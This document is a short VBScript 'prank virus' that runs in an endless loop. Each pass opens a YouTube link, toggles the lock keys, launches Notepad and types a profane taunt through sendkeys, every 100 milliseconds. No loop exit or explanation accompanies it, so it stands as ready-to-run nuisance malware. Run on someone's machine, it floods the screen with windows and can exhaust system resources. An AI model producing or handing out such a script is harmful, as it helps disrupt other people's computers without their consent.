

Set wshShell = wscript.CreateObject("WScript.Shell") 

Set wshShell =wscript.CreateObject("WScript.Shell")

do

Dim url

Set url= CreateObject("WScript.Shell")

url.Run "https://www.youtube.com/watch?v=L0DzMEh5NDQ", 9

wscript.sleep 100

wshshell.sendkeys "{CAPSLOCK}"

wshshell.sendkeys "{NUMLOCK}"

wshshell.sendkeys "{SCROLLLOCK}"

Dim oShell

Set oShell = WScript.CreateObject ("WScript.Shell")

oShell.run "notepad.exe c:\text.txt"

Set oShell = Nothing

wscript.sleep 100 

wshshell.sendkeys "Y0u fuck3d Up!" 

loop

